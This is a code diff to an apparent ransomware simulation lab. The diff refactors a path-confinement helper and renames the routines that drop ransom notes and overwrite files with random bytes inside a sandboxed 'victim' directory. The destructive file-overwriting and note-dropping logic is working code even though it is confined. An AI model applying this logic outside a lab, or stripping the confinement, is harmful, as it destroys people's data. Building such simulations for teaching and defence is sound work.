@@ -10,16 +10,21 @@ from threading import Event, Lock, Thread
 
 
 ROOT_DIR = Path(__file__).resolve().parent.parent
-VICTIM_ROOT = (ROOT_DIR / "victim_server" / "user_files").resolve()
-VICTIM_BASE = str(VICTIM_ROOT)
+_VICTIM_ROOT = (ROOT_DIR / "victim_server" / "user_files").resolve()
+
+# Backwards-compatible aliases. Internal code always reads _VICTIM_ROOT so
+# tests can redirect the confined root with mock.patch.
+VICTIM_ROOT = _VICTIM_ROOT
+VICTIM_BASE = str(_VICTIM_ROOT)
 
 
-def safe_path(path, allow_root=False):
+def _confined_path(path, allow_root=False):
+    """Resolve ``path`` and return it only when inside the victim root."""
     try:
         candidate = Path(path).resolve(strict=False)
-        candidate.relative_to(VICTIM_ROOT)
+        candidate.relative_to(_VICTIM_ROOT)
 
-        if not allow_root and candidate == VICTIM_ROOT:
+        if not allow_root and candidate == _VICTIM_ROOT:
             return None
 
         return candidate
@@ -27,8 +32,12 @@ def safe_path(path, allow_root=False):
         return None
 
 
+# Backwards-compatible alias for earlier revisions of the lab.
+safe_path = _confined_path
+
+
 def victim_ready():
-    return VICTIM_ROOT.is_dir() and not VICTIM_ROOT.is_symlink()
+    return _VICTIM_ROOT.is_dir() and not _VICTIM_ROOT.is_symlink()
 
 
 class BaseRansomware:
@@ -95,21 +104,21 @@ class BaseRansomware:
         if not victim_ready():
             return files, folders
 
-        for directory, dirnames, filenames in os.walk(VICTIM_ROOT):
-            safe_directory = safe_path(directory, allow_root=True)
+        for directory, dirnames, filenames in os.walk(_VICTIM_ROOT):
+            safe_directory = _confined_path(directory, allow_root=True)
 
             if safe_directory is None:
                 continue
 
-            folders.append(safe_directory)
+            folders.append(str(safe_directory))
 
             for filename in filenames:
-                candidate = safe_path(
+                candidate = _confined_path(
                     safe_directory / filename
                 )
 
                 if candidate is not None and candidate.is_file():
-                    files.append(candidate)
+                    files.append(str(candidate))
 
         return files, folders
 
@@ -146,15 +155,15 @@ class BaseRansomware:
             if extension not in self.target_extensions:
                 return False
 
-        return safe_path(file_path) is not None
+        return _confined_path(file_path) is not None
 
-    def drop_note(self, folder):
-        folder = safe_path(folder, allow_root=True)
+    def drop_ransom_note(self, folder):
+        folder = _confined_path(folder, allow_root=True)
 
         if folder is None or not folder.is_dir():
             return False
 
-        note_path = safe_path(
+        note_path = _confined_path(
             folder / self.note_filename
         )
 
@@ -184,8 +193,8 @@ class BaseRansomware:
             self.log(f"Note failed: {exc}")
             return False
 
-    def modify_file(self, file_path):
-        file_path = safe_path(file_path)
+    def encrypt_file(self, file_path):
+        file_path = _confined_path(file_path)
 
         if (
             not victim_ready()
@@ -202,7 +211,7 @@ class BaseRansomware:
                     os.urandom(max(original_size, 1024))
                 )
 
-            new_path = safe_path(
+            new_path = _confined_path(
                 str(file_path) + self.extension
             )
 
@@ -210,7 +219,7 @@ class BaseRansomware:
                 return False
 
             if new_path.exists():
-                new_path = safe_path(
+                new_path = _confined_path(
                     str(file_path)
                     + "."
                     + str(time.time_ns())
@@ -257,7 +266,7 @@ class BaseRansomware:
             "%Y-%m-%d %H:%M:%S"
         )
 
-        self.log(f"Attack started on {VICTIM_ROOT}")
+        self.log(f"Attack started on {_VICTIM_ROOT}")
 
         try:
             files, folders = self.collect_files()
@@ -282,7 +291,7 @@ class BaseRansomware:
             for folder in folders:
                 if self.stop_event.is_set():
                     break
-                self.drop_note(folder)
+                self.drop_ransom_note(folder)
 
             self.stats["phase"] = "MODIFYING FILES"
 
@@ -290,7 +299,7 @@ class BaseRansomware:
                 if self.stop_event.is_set():
                     break
 
-                if self.modify_file(file_path):
+                if self.encrypt_file(file_path):
                     self.delay()
 
             self.stats["phase"] = "FINALIZING"
